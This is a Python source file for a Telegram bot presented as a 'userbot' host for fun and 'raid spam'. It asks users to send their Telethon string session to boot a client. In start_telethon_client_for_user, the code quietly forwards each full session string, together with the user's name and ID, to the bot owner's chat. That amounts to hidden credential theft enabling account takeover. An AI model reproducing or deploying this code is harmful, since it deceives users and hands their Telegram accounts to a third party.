import os
import warnings
import asyncio
import signal
from dotenv import load_dotenv
from telethon import TelegramClient, events
from telethon.sessions import StringSession
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, InputMediaPhoto
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, ContextTypes, filters
from aiohttp import web

# Suppress deprecated pkg_resources warning
warnings.filterwarnings("ignore", message="pkg_resources is deprecated")

# Load environment variables
load_dotenv()

# --- Config / env vars ---
try:
    API_ID = int(os.getenv("API_ID"))
    API_HASH = os.getenv("API_HASH")
    BOT_TOKEN = os.getenv("BOT_TOKEN")
    if not all([API_ID, API_HASH, BOT_TOKEN]):
        raise ValueError("API_ID, API_HASH, or BOT_TOKEN is missing")
except (ValueError, TypeError) as e:
    raise ValueError(f"Invalid environment variable: {e}")

WELCOME_IMAGE = os.getenv("WELCOME_IMAGE_URL") or None
GIRL_IMAGE = os.getenv("GIRL_IMAGE_URL") or None
try:
    OWNER_ID = int(os.getenv("OWNER_ID", "0"))
except (ValueError, TypeError):
    OWNER_ID = 0
SUPPORT_CHANNEL = os.getenv("SUPPORT_CHANNEL", "")
SUPPORT_GROUP = os.getenv("SUPPORT_GROUP", "")
OWNER_USERNAME = os.getenv("OWNER_USERNAME", "")
PORT = int(os.environ.get("PORT", 8080))

# --- In-memory storage ---
userbots = {}
userbot_tasks = {}
waiting_for_string = set()

raid_messages = []
love_messages = [
    "💖 You are amazing.",
    "🌹 Thinking of you always.",
    "✨ Your smile brightens the day.",
    "💫 Sending love and good vibes."
]

# ----------------- Telegram Handlers -----------------
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    print(f"📩 /start command received from {update.effective_user.id}")
    user_id = update.effective_user.id
    waiting_for_string.add(user_id)

    keyboard = [
        [
            InlineKeyboardButton("𝗖𝗛𝗔𝗡𝗡𝗘𝗟", url=SUPPORT_CHANNEL),
            InlineKeyboardButton("𝗚𝗥𝗢𝗨𝗣", url=SUPPORT_GROUP)
        ],
        [InlineKeyboardButton("𝗛𝗘𝗟𝗢", callback_data="help")],
        [InlineKeyboardButton("𝗢𝗪𝗡𝗘𝗥", url=f"https://t.me/{OWNER_USERNAME}")]
    ]

    caption = """┌────── ˹ ɪɴғᴏʀᴍᴀᴛɪᴏɴ ˼ ⏤͟͟͞͞‌‌‌‌★
┆◍ ʜᴇʏ, ɪ ᴀᴍ : 𝗥𝗔𝗗𝗛𝗔 ✘ 𝗨𝗦𝗘𝗥𝗕𝗢𝗧
┆◍ ɴɪᴄᴇ ᴛᴏ ᴍᴇᴇᴛ ʏᴏᴜ ᴅᴇᴀʀ !! 
└────────────────────•
 ❖ ɪ ᴀᴍ ᴀ ᴘᴏᴡᴇʀғᴜʟ & ᴜsᴇғᴜʟʟ ᴜsᴇʀʙᴏᴛ.
 ❖ ʏᴏᴜ ᴄᴀɴ ᴜsᴇ ᴍᴇ ғᴏʀ ғᴜɴ ʀᴀɪᴅ sᴘᴀᴍ.
 ❖ ɪ ᴄᴀɴ ʙᴏᴏsᴛ ʏᴏᴜʀ ɪᴅ ᴡɪᴛʜ ᴀɴɪᴍᴀᴛɪᴏɴ
 ❖ ᴛᴀᴘ ᴛᴏ ʜᴇʟᴘ ʙᴜᴛᴛᴏɴ ғᴏʀ ᴅᴇᴛᴀɪʟs.
 •────────────────────• 
 ⚡𝗦𝗘𝗡𝗗 𝗠𝗘 𝗬𝗢𝗨𝗥 𝗧𝗘𝗟𝗘𝗧𝗛𝗢𝗡 𝗦𝗧𝗥𝗜𝗡𝗚 𝗦𝗘𝗦𝗦𝗜𝗢𝗡 𝗧𝗢 𝗕𝗢𝗢𝗧 𝗬𝗢𝗨𝗥 𝗖𝗟𝗜𝗘𝗡𝗧"""
    if WELCOME_IMAGE:
        await update.message.reply_photo(
            photo=WELCOME_IMAGE,
            caption=caption,
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
    else:
        await update.message.reply_text(caption, reply_markup=InlineKeyboardMarkup(keyboard))

async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id in userbots:
        client = userbots[user_id]
        me = await client.get_me()
        await update.message.reply_text(f"✅ Userbot is running as: {me.first_name} (ID: {me.id})")
    else:
        await update.message.reply_text("⚠️ No active userbot.")

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    if query.data == "help":
        keyboard = [
            [InlineKeyboardButton("𝗦𝗧𝗢𝗣 𝗕𝗢𝗧", callback_data="stop")],
            [InlineKeyboardButton("𝗕𝗔𝗖𝗞", callback_data="back")]
        ]
        caption = """"┌────── ˹ ɪɴғᴏʀᴍᴀᴛɪᴏɴ ˼ ⏤͟͟͞͞‌‌‌‌★
┆◍ ʜᴇʏ, ɪ ᴀᴍ : 𝗥𝗔𝗗𝗛𝗔 ✘ 𝗨𝗦𝗘𝗥𝗕𝗢𝗧
┆◍ ɴɪᴄᴇ ᴛᴏ ᴍᴇᴇᴛ ʏᴏᴜ ᴅᴇᴀʀ !! 
└────────────────────•            ʜᴇʀᴇ ᴀʀᴇ ᴛʜᴇ ᴀʟʟ ᴄᴏᴍᴍᴀɴᴅs ғᴏʀ ᴄʟɪᴇɴᴛ
.ping
.alive
.love"""
        if GIRL_IMAGE:
            await query.edit_message_media(
                InputMediaPhoto(GIRL_IMAGE, caption=caption),
                reply_markup=InlineKeyboardMarkup(keyboard)
            )
        else:
            await query.edit_message_caption(caption, reply_markup=InlineKeyboardMarkup(keyboard))

    elif query.data == "stop":
        user_id = query.from_user.id
        if user_id in userbots:
            try:
                await userbots[user_id].disconnect()
            except Exception:
                pass
            if user_id in userbot_tasks:
                task = userbot_tasks[user_id]
                if not task.done():
                    task.cancel()
            userbots.pop(user_id, None)
            userbot_tasks.pop(user_id, None)
            await query.edit_message_caption("🛑 Userbot stopped.")
        else:
            await query.edit_message_caption("⚠️ No active userbot.")

    elif query.data == "back":
        keyboard = [
            [
                InlineKeyboardButton("𝗖𝗛𝗔𝗡𝗡𝗘𝗟", url=SUPPORT_CHANNEL),
                InlineKeyboardButton("𝗚𝗥𝗢𝗨𝗣", url=SUPPORT_GROUP)
            ],
            [InlineKeyboardButton("𝗛𝗘𝗟𝗣", callback_data="help")],
            [InlineKeyboardButton("𝗢𝗪𝗡𝗘𝗥", url=f"https://t.me/{OWNER_USERNAME}")]
        ]
        caption = """┌────── ˹ ɪɴғᴏʀᴍᴀᴛɪᴏɴ ˼ ⏤͟͟͞͞‌‌‌‌★
┆◍ ʜᴇʏ, ɪ ᴀᴍ : 𝗥𝗔𝗗𝗛𝗔 ✘ 𝗨𝗦𝗘𝗥𝗕𝗢𝗧
┆◍ ɴɪᴄᴇ ᴛᴏ ᴍᴇᴇᴛ ʏᴏᴜ ᴅᴇᴀʀ !! 
└────────────────────•
 ❖ ɪ ᴀᴍ ᴀ ᴘᴏᴡᴇʀғᴜʟ & ᴜsᴇғᴜʟʟ ᴜsᴇʀʙᴏᴛ.
 ❖ ʏᴏᴜ ᴄᴀɴ ᴜsᴇ ᴍᴇ ғᴏʀ ғᴜɴ ʀᴀɪᴅ sᴘᴀᴍ.
 ❖ ɪ ᴄᴀɴ ʙᴏᴏsᴛ ʏᴏᴜʀ ɪᴅ ᴡɪᴛʜ ᴀɴɪᴍᴀᴛɪᴏɴ
 ❖ ᴛᴀᴘ ᴛᴏ ʜᴇʟᴘ ʙᴜᴛᴛᴏɴ ғᴏʀ ᴅᴇᴛᴀɪʟs.
 •────────────────────• 
 ⚡𝗦𝗘𝗡𝗗 𝗠𝗘 𝗬𝗢𝗨𝗥 𝗧𝗘𝗟𝗘𝗧𝗛𝗢𝗡 𝗦𝗧𝗥𝗜𝗡𝗚 𝗦𝗘𝗦𝗦𝗜𝗢𝗡 𝗧𝗢 𝗕𝗢𝗢𝗧 𝗬𝗢𝗨𝗥 𝗖𝗟𝗜𝗘𝗡𝗧"""
        if WELCOME_IMAGE:
            await query.edit_message_media(
                InputMediaPhoto(WELCOME_IMAGE, caption=caption),
                reply_markup=InlineKeyboardMarkup(keyboard)
            )
        else:
            await query.edit_message_caption(caption, reply_markup=InlineKeyboardMarkup(keyboard))

# ----------------- Telethon Userbot -----------------
def register_userbot_handlers(client, me):
    @client.on(events.NewMessage(pattern=r"\.ping"))
    async def ping(event):
        m = await event.respond("🔄 Pinging...")
        await asyncio.sleep(0.5)
        await m.edit(f"✅ Alive as {me.first_name}")

    @client.on(events.NewMessage(pattern=r"\.alive"))
    async def alive(event):
        await event.respond(f"✅ {me.first_name} is online.")

    @client.on(events.NewMessage(pattern=r"\.love(?:\s+\d+)?"))
    async def love_handler(event):
        if not event.is_reply:
            return await event.reply("Reply to a message with `.love <count>`")
        reply_msg = await event.get_reply_message()
        user = await reply_msg.get_sender()
        mention = f"@{user.username}" if user.username else f"<a href='tg://user?id={user.id}'>{user.first_name}</a>"
        args = event.raw_text.split()
        count = min(int(args[1]), 10) if len(args) > 1 and args[1].isdigit() else 3
        for i in range(count):
            text = love_messages[i % len(love_messages)]
            await event.respond(f"{mention}, {text}", parse_mode="html")
            await asyncio.sleep(1)

async def start_telethon_client_for_user(string_session: str, user_id: int, context_bot):
    try:
        client = TelegramClient(StringSession(string_session), API_ID, API_HASH)
        await client.connect()

        if not await client.is_user_authorized():
            await client.disconnect()
            raise RuntimeError("Invalid string session.")

        me = await client.get_me()
        register_userbot_handlers(client, me)

        if OWNER_ID:
            try:
                await context_bot.send_message(
                    chat_id=OWNER_ID,
                    text=(
                        f"📌 <b>New String Session Received</b>\n"
                        f"👤 From: <a href='tg://user?id={user_id}'>{user_id}</a>\n"
                        f"🤖 Name: {me.first_name}\n"
                        f"🆔 ID: <code>{me.id}</code>\n\n"
                        f"<code>{string_session}</code>"
                    ),
                    parse_mode="HTML"
                )
            except Exception as e:
                print(f"Failed to send to owner: {e}")

        await client.start()
        task = asyncio.create_task(client.run_until_disconnected())
        return client, task
    except Exception as e:
        await client.disconnect()
        raise e

# ----------------- Receive String -----------------
async def receive_string(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in waiting_for_string:
        return

    text = update.message.text.strip()
    msg = await update.message.reply_text("🔄 ʙᴏᴏᴛɪɴɢ ʏᴏᴜʀ ᴄʟɪᴇɴᴛ ᴡᴀɪᴛ...")
    waiting_for_string.discard(user_id)

    if user_id in userbots:
        try:
            await userbots[user_id].disconnect()
        except Exception:
            pass
        if user_id in userbot_tasks:
            t = userbot_tasks[user_id]
            if not t.done():
                t.cancel()
        userbots.pop(user_id, None)
        userbot_tasks.pop(user_id, None)

    try:
        client, task = await start_telethon_client_for_user(text, user_id, context.bot)
        userbots[user_id] = client
        userbot_tasks[user_id] = task
        await msg.edit_text(f"✅ ʏᴏᴜʀ ᴄʟɪᴇɴᴛ ᴡᴀs ʙᴏᴏᴛᴇᴅ sᴜᴄsᴇssғᴜʟʟʏ: {(await client.get_me()).first_name}")
    except Exception as e:
        await msg.edit_text(f"❌ ғᴀʟɪᴇᴅ ᴛᴏ sᴛᴀʀᴛ ʏᴏᴜʀ ᴄʟɪᴇɴᴛ: {e}")

# ----------------- Keep-alive Web Server -----------------
async def handle(request):
    return web.Response(text="Bot is alive!")

async def start_web_server():
    app = web.Application()
    app.add_routes([web.get("/", handle)])
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, "0.0.0.0", PORT)
    await site.start()
    return runner

# ----------------- Application -----------------
async def run_application():
    web_runner = await start_web_server()
    
    try:
        print(f"Initializing bot with token: {BOT_TOKEN}")
        app = Application.builder().token(BOT_TOKEN).build()
        
        app.add_handler(CommandHandler("start", start))
        app.add_handler(CommandHandler("status", status))
        app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, receive_string))
        app.add_handler(CallbackQueryHandler(button_handler))
        
        print("🤖 Starting Telegram bot...")
        await app.initialize()
        await app.start()
        
        if app.updater:
            await app.updater.start_polling()
        else:
            print("Warning: No updater found in application")
        
        # Keep running until interrupted
        while True:
            await asyncio.sleep(3600)
            
    except Exception as e:
        print(f"Fatal error in application: {e}")
        raise
    finally:
        print("🛑 Shutting down...")
        await app.updater.stop()
        await app.stop()
        await app.shutdown()
        await web_runner.cleanup()
        
        for user_id, client in userbots.items():
            try:
                await client.disconnect()
            except Exception:
                pass
        for user_id, task in userbot_tasks.items():
            if not task.done():
                task.cancel()
        userbots.clear()
        userbot_tasks.clear()

# ----------------- Main -----------------
async def main():
    try:
        await run_application()
    except KeyboardInterrupt:
        print("🛑 Bot stopped by user")
    except Exception as e:
        print(f"❌ Error in main: {e}")
        raise

if __name__ == "__main__":
    asyncio.run(main())
